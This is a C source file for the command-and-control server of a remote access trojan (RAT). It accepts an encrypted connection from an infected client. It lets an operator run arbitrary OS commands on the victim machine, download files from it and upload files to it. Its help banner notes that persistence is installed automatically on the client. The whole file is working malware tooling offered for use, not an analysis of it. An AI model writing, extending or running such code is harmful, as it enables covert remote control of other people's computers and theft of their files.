#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <io.h>
    #define close closesocket
    #define sleep(x) Sleep((x)*1000)
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <sys/wait.h>
    #include <sys/time.h>
    #define INVALID_SOCKET -1
#endif

#include <sys/stat.h>

#include "../include/crypto.h"
#include "../include/util.h"

#define PORT 4444
#define BUFFER_SIZE 4096
#define MAX_COMMAND_SIZE 1024

typedef struct {
    char host[16];
    int port;
#ifdef _WIN32
    SOCKET server_fd;
    SOCKET client_fd;
#else
    int server_fd;
    int client_fd;
#endif
    struct sockaddr_in address;
    struct sockaddr_in client_addr;
    crypto_context_t crypto_ctx;
} RAT_SERVER;

void print_banner() {
    printf("======================================================\n");
    printf("                    C RAT Server                     \n");
    printf("======================================================\n");
    printf("Commands:\n");
    printf("======================================================\n");
    printf("System:\n");
    printf("  help                                 show this help menu\n");
    printf("  <any_command>                        execute any OS command\n");
    printf("  exit                                 terminate session\n");
    printf("\nFiles:\n");
    printf("  download <remote_file> [local_dest]  download file from client\n");
    printf("  upload <local_file> [remote_dest]    upload file to client\n");
    printf("\nNotes:\n");
    printf("  All standard OS commands work (ls, pwd, cd, etc.)\n");
    printf("  Windows commands work too (dir, type, etc.)\n");
    printf("  The prompt shows the current OS and directory\n");
    printf("  Persistence is installed automatically on client startup\n");
    printf("======================================================\n");
}

int perform_key_exchange(RAT_SERVER *server);

int perform_key_exchange(RAT_SERVER *server) {
    unsigned char *our_public_key = NULL;
    int our_key_len = 0;
    unsigned char *peer_public_key = NULL;
    int peer_key_len = 0;
    unsigned char *encrypted_aes_key = NULL;
    int encrypted_key_len = 0;
    int result = -1;
    
    // Export our public key
    if (crypto_export_public_key(&server->crypto_ctx, &our_public_key, &our_key_len) != 0) {
        printf("Error: Failed to export public key\n");
        goto cleanup;
    }
    
    // Send our public key length and key
    uint32_t key_len_net = htonl(our_key_len);
    if (send_all(server->client_fd, &key_len_net, sizeof(key_len_net), 0) != 0) {
        printf("Error: Failed to send public key length\n");
        goto cleanup;
    }
    
    if (send_all(server->client_fd, our_public_key, our_key_len, 0) != 0) {
        printf("Error: Failed to send public key\n");
        goto cleanup;
    }
    
    // Receive peer's public key length
    uint32_t peer_key_len_net;
    if (recv_all(server->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != 0) {
        printf("Error: Failed to receive peer public key length\n");
        goto cleanup;
    }
    peer_key_len = ntohl(peer_key_len_net);
    
    if (peer_key_len <= 0 || peer_key_len > 4096) {
        printf("Error: Invalid peer public key length\n");
        goto cleanup;
    }
    
    // Receive peer's public key
    peer_public_key = malloc(peer_key_len);
    if (!peer_public_key) {
        printf("Error: Memory allocation failed\n");
        goto cleanup;
    }
    
    if (recv_all(server->client_fd, peer_public_key, peer_key_len, 0) != 0) {
        printf("Error: Failed to receive peer public key\n");
        goto cleanup;
    }
    
    // Import peer's public key
    if (crypto_import_public_key(&server->crypto_ctx, peer_public_key, peer_key_len) != 0) {
        printf("Error: Failed to import peer public key\n");
        goto cleanup;
    }
    
    // Server generates AES key and sends it to client
    if (crypto_generate_aes_key(&server->crypto_ctx) != 0) {
        printf("Error: Failed to generate AES key\n");
        goto cleanup;
    }
    
    // Encrypt AES key with peer's public key
    if (crypto_encrypt_aes_key(&server->crypto_ctx, &encrypted_aes_key, &encrypted_key_len) != 0) {
        printf("Error: Failed to encrypt AES key\n");
        goto cleanup;
    }
    
    // Send encrypted AES key length and key
    uint32_t enc_key_len_net = htonl(encrypted_key_len);
    if (send_all(server->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != 0) {
        printf("Error: Failed to send encrypted key length\n");
        goto cleanup;
    }
    
    if (send_all(server->client_fd, encrypted_aes_key, encrypted_key_len, 0) != 0) {
        printf("Error: Failed to send encrypted AES key\n");
        goto cleanup;
    }
    
    // Mark encryption as active
    server->crypto_ctx.is_encrypted = 1;
    result = 0;
    
cleanup:
    if (our_public_key) free(our_public_key);
    if (peer_public_key) free(peer_public_key);
    if (encrypted_aes_key) free(encrypted_aes_key);
    
    return result;
}

int setup_server(RAT_SERVER *server) {
#ifdef _WIN32
    WSADATA wsaData;
    int wsaResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (wsaResult != 0) {
        printf("WSAStartup failed: %d\n", wsaResult);
        return -1;
    }
#endif

    int opt = 1;
    
    // Create socket
    if ((server->server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
#ifdef _WIN32
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
#else
        perror("Socket creation failed");
#endif
        return -1;
    }
    
    // Set socket options
    if (setsockopt(server->server_fd, SOL_SOCKET, SO_REUSEADDR, 
                   (char*)&opt, sizeof(opt))) {
#ifdef _WIN32
        printf("Setsockopt failed: %d\n", WSAGetLastError());
#else
        perror("Setsockopt failed");
#endif
        return -1;
    }
    
    server->address.sin_family = AF_INET;
    server->address.sin_addr.s_addr = inet_addr(server->host);
    server->address.sin_port = htons(server->port);
    
    // Bind socket
    if (bind(server->server_fd, (struct sockaddr *)&server->address, 
             sizeof(server->address)) < 0) {
#ifdef _WIN32
        printf("Bind failed: %d\n", WSAGetLastError());
#else
        perror("Bind failed");
#endif
        return -1;
    }
    
    // Listen for connections
    if (listen(server->server_fd, 5) < 0) {
#ifdef _WIN32
        printf("Listen failed: %d\n", WSAGetLastError());
#else
        perror("Listen failed");
#endif
        return -1;
    }
    
    printf("[*] Server listening on %s:%d\n", server->host, server->port);
    return 0;
}

int accept_client(RAT_SERVER *server) {
    socklen_t client_len = sizeof(server->client_addr);
    char client_info[BUFFER_SIZE];
    
    printf("[*] Waiting for client connection...\n");
    
    if ((server->client_fd = accept(server->server_fd, 
                                   (struct sockaddr *)&server->client_addr, 
                                   &client_len)) == INVALID_SOCKET) {
#ifdef _WIN32
        printf("Accept failed: %d\n", WSAGetLastError());
#else
        perror("Accept failed");
#endif
        return -1;
    }
    
    // PSK authentication (if configured) — happens before crypto init on raw TCP
    if (server->crypto_ctx.psk_hash[0] != 0) {
        if (crypto_send_psk_challenge(server->client_fd, &server->crypto_ctx, 0) != 0 ||
            crypto_recv_psk_challenge(server->client_fd, &server->crypto_ctx, 0) != 0) {
            printf("[!] PSK authentication failed — client rejected\n");
            close(server->client_fd);
            server->client_fd = INVALID_SOCKET;
            return -1;
        }
        printf("[*] PSK authentication successful\n");
    }
    
    // Initialize crypto context for server
    if (crypto_init(&server->crypto_ctx, 1) != 0) {
        printf("Error: Failed to initialize encryption\n");
        close(server->client_fd);
        server->client_fd = INVALID_SOCKET;
        return -1;
    }
    
    // Perform key exchange
    if (perform_key_exchange(server) != 0) {
        printf("Error: Key exchange failed\n");
        crypto_cleanup(&server->crypto_ctx);
        close(server->client_fd);
        server->client_fd = INVALID_SOCKET;
        return -1;
    }
    
    // Receive client information (now encrypted)
    memset(client_info, 0, BUFFER_SIZE);
    int bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, client_info, BUFFER_SIZE - 1, 0);
    if (bytes_received > 0) {
        client_info[bytes_received] = '\0';
        printf("[*] Connection established with %s\n", client_info);
    } else {
        printf("[*] Connection established (client info not available)\n");
    }
    printf("[*] Client IP: %s\n", inet_ntoa(server->client_addr.sin_addr));
    printf("[*] Encrypted communication established\n");
    
    return 0;
}

void send_command(RAT_SERVER *server, const char *command) {
    char command_with_newline[MAX_COMMAND_SIZE + 2];
    
    if (!server || !command) {
        printf("Error: Invalid parameters passed to send_command\n");
        return;
    }
    
    if (strlen(command) > MAX_COMMAND_SIZE) {
        printf("Error: Command too long (max %d characters)\n", MAX_COMMAND_SIZE);
        return;
    }
    
    snprintf(command_with_newline, sizeof(command_with_newline), "%s\n", command);
    
    int bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, command_with_newline, strlen(command_with_newline), 0);
    if (bytes_sent <= 0) {
#ifdef _WIN32
        printf("Error: Failed to send command to client (WSA Error: %d)\n", WSAGetLastError());
#else
        perror("Error: Failed to send command to client");
#endif
        // Connection might be broken
        server->client_fd = INVALID_SOCKET;
    } else if (bytes_sent != (int)strlen(command_with_newline)) {
        printf("Warning: Partial command sent (%d of %zu bytes)\n", bytes_sent, strlen(command_with_newline));
    }
}

void receive_response(RAT_SERVER *server) {
    char buffer[BUFFER_SIZE];
    char full_response[BUFFER_SIZE * 4] = {0};
    int bytes_received;
    int total_received = 0;
    int max_response_size = sizeof(full_response) - 1;
    
    if (!server) {
        printf("Error: Invalid server parameter in receive_response\n");
        return;
    }
    
    if (server->client_fd == INVALID_SOCKET) {
        printf("Error: No active client connection\n");
        return;
    }
    
    // Read the full response in a single recv (client sends it all at once)
    memset(buffer, 0, BUFFER_SIZE);
    bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, BUFFER_SIZE - 1, 0);
    
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        if (bytes_received <= max_response_size) {
            strcat(full_response, buffer);
        } else {
            strncat(full_response, buffer, max_response_size - 1);
        }
        total_received = bytes_received;
    } else if (bytes_received == 0) {
        printf("\nClient disconnected\n");
        server->client_fd = INVALID_SOCKET;
    } else {
        perror("Error receiving data from client");
        server->client_fd = INVALID_SOCKET;
    }
    
    if (total_received > 0) {
        printf("%s", full_response);
        fflush(stdout);
    }
}

void handle_download(RAT_SERVER *server, const char *remote_filename, const char *local_destination) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    int bytes_received;
    char filepath[512];
    
    if (!server || !remote_filename) {
        printf("Error: Invalid parameters passed to handle_download\n");
        return;
    }
    
    if (server->client_fd == INVALID_SOCKET) {
        printf("Error: No active client connection\n");
        return;
    }
    
    if (strlen(remote_filename) > 400) {
        printf("Error: Remote filename too long\n");
        return;
    }
    
    // Determine local file path
    if (local_destination && strlen(local_destination) > 0) {
        // Check if destination is a directory
        struct stat st;
        if (stat(local_destination, &st) == 0 && S_ISDIR(st.st_mode)) {
            // Destination is a directory, append filename
            const char *base_filename = find_base_name(remote_filename);
#ifdef _WIN32
            snprintf(filepath, sizeof(filepath), "%s\\%s", local_destination, base_filename);
#else
            snprintf(filepath, sizeof(filepath), "%s/%s", local_destination, base_filename);
#endif
        } else {
            // Destination is a full file path
            strncpy(filepath, local_destination, sizeof(filepath) - 1);
            filepath[sizeof(filepath) - 1] = '\0';
        }
    } else {
        // No destination specified, use current directory with base filename
        const char *base_filename = find_base_name(remote_filename);
        snprintf(filepath, sizeof(filepath), ".%c%s", 
#ifdef _WIN32
            '\\',
#else
            '/',
#endif
            base_filename);
    }
    
    // Receive file size first
    uint32_t fsz_hi = 0, fsz_lo = 0;
    crypto_recv(server->client_fd, &server->crypto_ctx, &fsz_hi, sizeof(fsz_hi), 0);
    crypto_recv(server->client_fd, &server->crypto_ctx, &fsz_lo, sizeof(fsz_lo), 0);
    uint64_t file_remaining = ((uint64_t)ntohl(fsz_hi) << 32) | ntohl(fsz_lo);
    
    file = fopen(filepath, "wb");
    if (!file) {
        printf("Error: Cannot create file %s - %s\n", filepath, strerror(errno));
        // Drain remaining data
        while (file_remaining > 0) {
            int to_skip = (file_remaining > BUFFER_SIZE) ? BUFFER_SIZE : (int)file_remaining;
            int skipped = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, to_skip, 0);
            if (skipped <= 0) break;
            file_remaining -= skipped;
        }
        return;
    }
    
    printf("Downloading file: %s", remote_filename);
    if (local_destination && strlen(local_destination) > 0) {
        printf(" to %s", filepath);
    }
    printf("\n");
    
    // Receive exactly file_remaining bytes
    while (file_remaining > 0) {
        int to_read = (file_remaining > BUFFER_SIZE) ? BUFFER_SIZE : (int)file_remaining;
        bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, to_read, 0);
        if (bytes_received <= 0) {
            printf("Error: Failed to receive file data\n");
            fclose(file);
            unlink(filepath);
            return;
        }
        size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
        if (bytes_written != (size_t)bytes_received) {
            printf("Error: Failed to write data to file (wrote %zu of %d bytes)\n", bytes_written, bytes_received);
            fclose(file);
            unlink(filepath);
            return;
        }
        file_remaining -= bytes_received;
    }
    
    if (fclose(file) != 0) {
        printf("Warning: Error closing file %s - %s\n", filepath, strerror(errno));
    }
    
    printf("File downloaded successfully as: %s\n", filepath);
}

void handle_upload(RAT_SERVER *server, const char *filename, const char *destination) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    char upload_info[512];
    
    if (!server || !filename) {
        printf("Error: Invalid parameters passed to handle_upload\n");
        return;
    }
    
    if (server->client_fd == INVALID_SOCKET) {
        printf("Error: No active client connection\n");
        return;
    }
    
    if (strlen(filename) > 400) {
        printf("Error: Filename too long\n");
        return;
    }
    
    file = fopen(filename, "rb");
    if (!file) {
        printf("Error: Cannot open file %s - %s\n", filename, strerror(errno));
        return;
    }
    
    printf("Uploading file: %s", filename);
    if (destination && strlen(destination) > 0) {
        printf(" to %s", destination);
    }
    printf("\n");
    
    // Send destination path and filename in format "destination|filename" followed by newline
    if (destination && strlen(destination) > 0) {
        snprintf(upload_info, sizeof(upload_info), "%s|%s\n", destination, filename);
    } else {
        // Extract just the filename for default location
        const char *base_filename = find_base_name(filename);
        snprintf(upload_info, sizeof(upload_info), "|%s\n", base_filename);
    }
    
    int bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, upload_info, strlen(upload_info), 0);
    if (bytes_sent <= 0) {
#ifdef _WIN32
        printf("Error: Failed to send upload info (WSA Error: %d)\n", WSAGetLastError());
#else
        perror("Error: Failed to send upload info");
#endif
        fclose(file);
        return;
    }
    
    // Wait for acknowledgment from client before sending file content
    char ack[10];
    int ack_received = crypto_recv(server->client_fd, &server->crypto_ctx, ack, sizeof(ack), 0);
    if (ack_received <= 0) {
#ifdef _WIN32
        printf("Error: Failed to receive acknowledgment from client (WSA Error: %d)\n", WSAGetLastError());
#else
        perror("Error: Failed to receive acknowledgment from client");
#endif
        fclose(file);
        return;
    }
    
    // Get file size for EOF framing
    struct stat file_stat;
    if (stat(filename, &file_stat) != 0) {
        printf("Error: Cannot stat file %s - %s\n", filename, strerror(errno));
        fclose(file);
        return;
    }
    uint64_t fsize = (uint64_t)file_stat.st_size;
    
    // Send file size first (two uint32_t in network order)
    {
        uint32_t sz_hi = htonl((uint32_t)(fsize >> 32));
        uint32_t sz_lo = htonl((uint32_t)(fsize & 0xFFFFFFFF));
        crypto_send(server->client_fd, &server->crypto_ctx, &sz_hi, sizeof(sz_hi), 0);
        crypto_send(server->client_fd, &server->crypto_ctx, &sz_lo, sizeof(sz_lo), 0);
    }
    
    // Send file content
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, buffer, bytes_read, 0);
        if (bytes_sent <= 0) {
#ifdef _WIN32
            printf("Error: Failed to send file data (WSA Error: %d)\n", WSAGetLastError());
#else
            perror("Error: Failed to send file data");
#endif
            fclose(file);
            return;
        }
    }
    
    if (ferror(file)) {
        printf("Error: Failed to read file %s\n", filename);
    }
    
    if (fclose(file) != 0) {
        printf("Warning: Error closing file %s - %s\n", filename, strerror(errno));
    }
    
    printf("File uploaded successfully\n");
}

void execute_commands(RAT_SERVER *server) {
    char command[MAX_COMMAND_SIZE];
    char *args[10];
    char *token;
    int arg_count;
    
    if (!server) {
        printf("Error: Invalid server parameter in execute_commands\n");
        return;
    }
    
    if (server->client_fd == INVALID_SOCKET) {
        printf("Error: No active client connection\n");
        return;
    }
    
    print_banner();
    
    // Wait for initial prompt from client
    printf("Waiting for client prompt...\n");
    receive_response(server);
    
    while (1) {
        // Check if connection is still valid
        if (server->client_fd == INVALID_SOCKET) {
            printf("Connection lost. Exiting command loop.\n");
            break;
        }
        
        // Client prompt is already displayed by receive_response above
        if (!fgets(command, sizeof(command), stdin)) {
            if (feof(stdin)) {
                printf("\nEnd of input. Exiting...\n");
            } else {
                perror("Error reading command input");
            }
            break;
        }
        
        // Remove newline
        command[strcspn(command, "\n")] = 0;
        
        if (strlen(command) == 0) {
            continue;
        }
        
        // Parse command
        arg_count = 0;
        char command_copy[MAX_COMMAND_SIZE];
        strcpy(command_copy, command);
        token = strtok(command_copy, " ");
        while (token != NULL && arg_count < 9) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
        args[arg_count] = NULL;
        
        if (strcmp(args[0], "help") == 0) {
            print_banner();
        }
        else if (strcmp(args[0], "download") == 0) {
            if (arg_count < 2) {
                printf("Usage: download <remote_file> [local_destination]\n");
                printf("  remote_file       - path to file on client to download\n");
                printf("  local_destination - optional local path where to save file\n");
                continue;
            }
            send_command(server, command);
            // Check if connection is still active after sending command
            if (server->client_fd != INVALID_SOCKET) {
                if (arg_count >= 3) {
                    handle_download(server, args[1], args[2]);  // With destination
                } else {
                    handle_download(server, args[1], NULL);     // Default location
                }
                // Wait for confirmation from client
                if (server->client_fd != INVALID_SOCKET) {
                    receive_response(server);
                }
            }
        }
        else if (strcmp(args[0], "upload") == 0) {
            if (arg_count < 2) {
                printf("Usage: upload <local_file> [remote_destination]\n");
                printf("  local_file         - path to file on server to upload\n");
                printf("  remote_destination - optional path on client where to save file\n");
                continue;
            }
            send_command(server, "upload");
            // Check if connection is still active after sending command
            if (server->client_fd != INVALID_SOCKET) {
                if (arg_count >= 3) {
                    handle_upload(server, args[1], args[2]);  // With destination
                } else {
                    handle_upload(server, args[1], NULL);     // Default location
                }
                // Wait for confirmation from client
                if (server->client_fd != INVALID_SOCKET) {
                    receive_response(server);
                }
            }
        }
        else if (strcmp(args[0], "exit") == 0) {
            send_command(server, "exit");
            printf("Terminating connection...\n");
            break;
        }
        else {
            // Send command to client and receive response with prompt
            send_command(server, command);
            if (server->client_fd != INVALID_SOCKET) {
                receive_response(server);
            }
        }
    }
}

void cleanup(RAT_SERVER *server) {
    if (server->client_fd != INVALID_SOCKET) {
        close(server->client_fd);
    }
    if (server->server_fd != INVALID_SOCKET) {
        close(server->server_fd);
    }
    crypto_cleanup(&server->crypto_ctx);
#ifdef _WIN32
    WSACleanup();
#endif
}

void signal_handler(int sig) {
    printf("\nReceived signal %d. Shutting down...\n", sig);
    exit(0);
}

int main() {
    RAT_SERVER server;
    
    memset(&server.crypto_ctx, 0, sizeof(server.crypto_ctx));
    
    // Setup signal handlers
#ifndef _WIN32
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
#endif
    
    // Pre-shared key for client authentication
    const char *psk = getenv("RAT_PSK");
    if (psk) {
        crypto_set_psk(&server.crypto_ctx, psk);
        printf("[*] PSK authentication enabled\n");
    }
    
    // Initialize server
    const char *host_env = getenv("RAT_HOST");
    if (host_env) {
        strncpy(server.host, host_env, sizeof(server.host) - 1);
        server.host[sizeof(server.host) - 1] = '\0';
    } else {
        strcpy(server.host, "0.0.0.0");
    }
    server.port = PORT;
#ifdef _WIN32
    server.client_fd = INVALID_SOCKET;
    server.server_fd = INVALID_SOCKET;
#else
    server.client_fd = -1;
    server.server_fd = -1;
#endif
    
    if (setup_server(&server) < 0) {
        cleanup(&server);
        return 1;
    }
    
    if (accept_client(&server) < 0) {
        cleanup(&server);
        return 1;
    }
    
    execute_commands(&server);
    
    cleanup(&server);
    return 0;
}